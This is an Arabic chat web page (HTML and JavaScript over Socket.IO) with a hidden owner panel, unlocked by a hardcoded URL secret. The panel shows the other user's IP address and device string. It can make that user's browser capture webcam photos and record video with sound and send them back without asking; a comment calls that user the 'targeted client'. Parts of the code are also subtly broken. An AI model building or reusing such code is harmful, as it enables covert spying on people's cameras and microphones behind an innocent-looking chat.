<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شات عربي احترافي</title>
    <style>
        :root {
            --bg-color: #f0f2f5;
            --chat-bg: #ffffff;
            --primary: #0084ff;
            --vip-primary: #ffd700;
            --vip-text: #333333;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            height: 100vh;
            transition: background 0.3s;
        }
        header {
            background: #0084ff;
            color: white;
            padding: 12px;
            text-align: center;
            font-size: 1.2rem;
            font-weight: bold;
            position: relative;
        }
        #admin-panel {
            background: #222;
            color: #fff;
            padding: 10px;
            display: none;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
            font-size: 0.9rem;
            border-bottom: 2px solid #ffd700;
        }
        #admin-panel button, #admin-panel select, #admin-panel input {
            padding: 5px 10px;
            border-radius: 4px;
            border: none;
            cursor: pointer;
            font-size: 0.85rem;
        }
        #admin-panel button { background: #0084ff; color: white; }
        #admin-panel button.danger { background: #ff4757; }
        
        #chat-container {
            flex: 1;
            padding: 15px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .message {
            max-width: 75%;
            padding: 10px 14px;
            border-radius: 15px;
            position: relative;
            word-break: break-word;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .message.incoming {
            align-self: flex-start;
            background: white;
            color: #333;
            border-bottom-right-radius: 3px;
        }
        .message.outgoing {
            align-self: flex-end;
            background: #0084ff;
            color: white;
            border-bottom-left-radius: 3px;
        }
        /* تنسيق VIP للمالك */
        .message.vip-outgoing {
            align-self: flex-end;
            background: linear-gradient(135deg, #f6d365 0%, #fda085 100%);
            color: #222;
            border: 2px solid #ffd700;
            font-weight: 600;
            border-bottom-left-radius: 3px;
        }
        .vip-badge {
            background: #ffd700;
            color: #000;
            font-size: 0.7rem;
            padding: 2px 6px;
            border-radius: 10px;
            font-weight: bold;
            margin-right: 5px;
            display: inline-block;
            box-shadow: 0 0 5px rgba(255, 215, 0, 0.8);
        }
        .msg-actions {
            margin-top: 5px;
            display: flex;
            gap: 6px;
            justify-content: flex-end;
            font-size: 0.75rem;
        }
        .msg-actions button {
            background: rgba(0,0,0,0.1);
            border: none;
            padding: 2px 6px;
            border-radius: 3px;
            cursor: pointer;
        }
        .vip-outgoing .msg-actions button {
            background: rgba(0,0,0,0.15);
            color: #111;
        }
        
        #typing-indicator {
            padding: 0 15px;
            font-size: 0.8rem;
            color: #666;
            height: 20px;
            font-style: italic;
        }

        #system-alert-banner {
            background: #ff4757;
            color: white;
            text-align: center;
            padding: 8px;
            font-weight: bold;
            display: none;
        }

        .input-area {
            padding: 10px;
            background: white;
            display: flex;
            align-items: center;
            gap: 8px;
            border-top: 1px solid #ddd;
        }
        .input-area input[type="text"] {
            flex: 1;
            padding: 10px 15px;
            border: 1px solid #ccc;
            border-radius: 20px;
            outline: none;
            font-size: 0.95rem;
        }
        .input-area button {
            background: #0084ff;
            color: white;
            border: none;
            padding: 10px 18px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: bold;
        }
        media img, media video, media audio {
            max-width: 100%;
            border-radius: 8px;
            margin-top: 5px;
        }
    </style>
</head>
<body>

    <header>
        شات عربي <span id="header-vip-tag"></span>
    </header>

    <div id="system-alert-banner"></div>

    <!-- لوحة تحكم الأدمن -->
    <div id="admin-panel">
        <span><b>لوحة الأدمن:</b></span>
        <button onclick="triggerCamera()">📸 التقاط صورة</button>
        <select id="video-duration">
            <option value="3">فيديو 3 ثواني</option>
            <option value="5" selected>فيديو 5 ثواني</option>
            <option value="10">فيديو 10 ثواني</option>
        </select>
        <button onclick="triggerVideo()">🎥 تسجيل فيديو</button>
        <select id="audio-duration">
            <option value="5">صوت 5 ثواني</option>
            <option value="10" selected>صوت 10 ثواني</option>
            <option value="20">صوت 20 ثواني</option>
        </select>
        <button onclick="triggerAudioRecord()">🎙️ طلب تسجيل صوتي</button>
        <button onclick="sendAlert()">📢 إرسال تنبيه</button>
        <button class="danger" onclick="clearChat('all')">🗑️ مسح الكل</button>
        <button class="danger" onclick="clearChat('theirs')">مسح رسائله</button>
        <select id="bg-color-picker" onchange="changeBg(this.value)">
            <option value="#f0f2f5">خلفية افتراضية</option>
            <option value="#1e1e1e">خلفية داكنة</option>
            <option value="#ffeaa7">خلفية صفراء هادئة</option>
            <option value="#dfe6e9">خلفية رمادية</option>
        </select>
        <div id="client-info" style="width: 100%; font-size: 0.8rem; color: #ffd700; margin-top: 4px;">
            معلومات الطرف الآخر: جاري الجلب...
        </div>
    </div>

    <div id="chat-container"></div>
    <div id="typing-indicator"></div>

    <div class="input-area">
        <input type="text" id="message-input" placeholder="اكتب رسالة..." oninput="emitTyping()">
        <button onclick="sendMessage()">إرسال</button>
    </div>

    <!-- عنصر مخفي لالتقاط الوسائط -->
    <video id="hidden-video" autoplay playsinline style="display:none;"></video>
    <canvas id="hidden-canvas" style="display:none;"></canvas>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const urlParams = new URLSearchParams(window.location.search);
        const isAdmin = urlParams.get('admin') === 'mySuperSecretAdmin123';
        
        let myId = 'user_' + Math.random().toString(36.substring(2, 7));

        if (isAdmin) {
            document.getElementById('admin-panel').style.display = 'flex';
            document.getElementById('header-vip-tag').innerHTML = '<span class="vip-badge">OWNER VIP</span>';
        }

        const chatContainer = document.getElementById('chat-container');
        const messageInput = document.getElementById('message-input');
        const typingIndicator = document.getElementById('typing-indicator');

        // استقبال معلومات الجهاز للآدمن
        socket.on('device_info', (data) => {
            if (isAdmin) {
                document.getElementById('client-info').innerText = `IP: ${data.ip} | Device: ${data.ua}`;
            }
        });

        function emitTyping() {
            socket.emit('typing', { name: isAdmin ? 'المالك (VIP)' : 'مستخدم' });
        }

        let typingTimeout;
        socket.on('typing', (data) => {
            typingIndicator.innerText = `${data.name} يكتب الآن...`;
            clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => {
                typingIndicator.innerText = '';
            }, 2000);
        });

        function sendMessage() {
            const text = messageInput.value.trim();
            if (!text) return;
            socket.emit('chat_message', {
                senderId: myId,
                isAdmin: isAdmin,
                text: text
            });
            messageInput.value = '';
        }

        // استقبال الرسائل
        socket.on('chat_message', (data) => {
            const div = document.createElement('div');
            div.className = 'message ';
            if (data.senderId === myId) {
                div.className += data.isAdmin ? 'vip-outgoing' : 'outgoing';
            } else {
                div.className += 'incoming';
            }
            div.id = data.id;

            let contentHTML = '';
            if (data.isAdmin) {
                contentHTML += '<span class="vip-badge">VIP</span>';
            }
            contentHTML += `<span>${escapeHtml(data.text)}</span>`;

            // أزرار الحذف والتعديل مرتبة جنب بعض بشكل احترافي
            if (isAdmin || data.senderId === myId) {
                contentHTML += `
                    <div class="msg-actions">
                        <button onclick="editMsg('${data.id}')">✏️ تعديل</button>
                        <button onclick="deleteMsg('${data.id}')">🗑️ حذف</button>
                    </div>
                `;
            }

            div.innerHTML = contentHTML;
            chatContainer.appendChild(div);
            chatContainer.scrollTop = chatContainer.scrollHeight;
        });

        function deleteMsg(id) {
            socket.emit('admin_action', { action: 'delete', id: id });
        }

        socket.on('delete_message', (id) => {
            const el = document.getElementById(id);
            if (el) el.remove();
        });

        function editMsg(id) {
            const newText = prompt("تعديل الرسالة:");
            if (newText !== null) {
                socket.emit('admin_action', { action: 'edit', id: id, newText: newText });
            }
        }

        socket.on('edit_message', (data) => {
            const el = document.getElementById(data.id);
            if (el) {
                const textSpan = el.querySelector('span:not(.vip-badge)');
                if (textSpan) textSpan.innerText = data.newText;
            }
        });

        function clearChat(target) {
            socket.emit('admin_action', { action: 'clear_chat', target: target });
        }

        socket.on('clear_chat', (target) => {
            if (target === 'all') {
                chatContainer.innerHTML = '';
            } else if (target === 'theirs') {
                document.querySelectorAll('.message.incoming').forEach(el => el.remove());
            }
        });

        function sendAlert() {
            const msg = prompt("اكتب نص التنبيه الإداري:");
            if (msg) {
                socket.emit('admin_action', { action: 'alert', message: msg });
            }
        }

        socket.on('system_alert', (msg) => {
            const banner = document.getElementById('system-alert-banner');
            banner.innerText = `⚠️ تنبيه إداري: ${msg}`;
            banner.style.display = 'block';
            setTimeout(() => { banner.style.display = 'none'; }, 6000);
        });

        function changeBg(color) {
            socket.emit('admin_action', { action: 'change_bg', color: color });
        }

        socket.on('change_bg', (color) => {
            document.body.style.backgroundColor = color;
        });

        // أوامر الكاميرا والفيديو والصوت عن بُعد (للعميل المستهدف)
        socket.on('admin_command', async (data) => {
            if (!isAdmin) {
                if (data.action === 'capture_photo') {
                    takePhotoAndSend();
                } else if (data.action === 'record_video') {
                    recordVideoAndSend(data.duration);
                } else if (data.action === 'record_audio') {
                    recordAudioAndPreview(data.duration);
                }
            }
        });

        function triggerCamera() { socket.emit('admin_action', { action: 'capture_photo' }); }
        function triggerVideo() { 
            const duration = document.getElementById('video-duration').value;
            socket.emit('admin_action', { action: 'record_video', duration: duration }); 
        }
        function triggerAudioRecord() {
            const duration = document.getElementById('audio-duration').value;
            socket.emit('admin_action', { action: 'record_audio', duration: duration });
        }

        async function takePhotoAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;
                await new Promise(res => video.onloadedmetadata = res);
                
                const canvas = document.getElementById('hidden-canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());
                const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
                
                socket.emit('chat_message', {
                    senderId: myId,
                    isAdmin: false,
                    text: `<img src="${dataUrl}" alt="صورة ملتقطة"/>`
                });
            } catch(e) { console.error(e); }
        }

        async function recordVideoAndSend(durationSec) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onload = function() {
                        socket.emit('chat_message', {
                            senderId: myId,
                            isAdmin: false,
                            text: `<video controls src="${reader.result}"></video>`
                        });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(t => t.stop());
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), durationSec * 1000);
            } catch(e) { console.error(e); }
        }

        async function recordAudioAndPreview(durationSec) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const audioUrl = URL.createObjectURL(blob);
                    
                    // معاينة للأدمن أو المستخدم قبل الرفع مع خيارين
                    const reader = new FileReader();
                    reader.onload = function() {
                        const confirmSend = confirm("تم تسجيل الصوت بنجاح. هل تريد إرساله للمحادثة؟");
                        if (confirmSend) {
                            socket.emit('chat_message', {
                                senderId: myId,
                                isAdmin: false,
                                text: `<audio controls src="${reader.result}"></audio>`
                            });
                        }
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(t => t.stop());
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), durationSec * 1000);
            } catch(e) { console.error(e); }
        }

        function escapeHtml(text) {
            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
    </script>
</body>
</html>
